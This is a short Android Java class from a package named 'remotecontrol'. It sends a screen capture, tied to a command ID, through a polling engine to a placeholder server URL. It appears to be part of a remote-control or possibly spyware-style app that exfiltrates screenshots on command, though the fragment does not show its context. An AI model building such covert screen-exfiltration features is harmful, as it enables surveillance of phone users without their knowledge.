package com.remotecontrol;

import android.graphics.Bitmap;

public class ScreenCapture {

    public static void sendScreenshot(Bitmap bitmap, int commandId) {

        TelegramService svc = TelegramService.getInstance();
        if (svc == null) return;

        HttpPollingEngine engine = svc.getEngine();
        if (engine == null) return;

        ScreenCaptureSender sender = new ScreenCaptureSender(
                "http://YOUR_SERVER_URL",
                engine
        );

        sender.send(bitmap, commandId);
    }
}
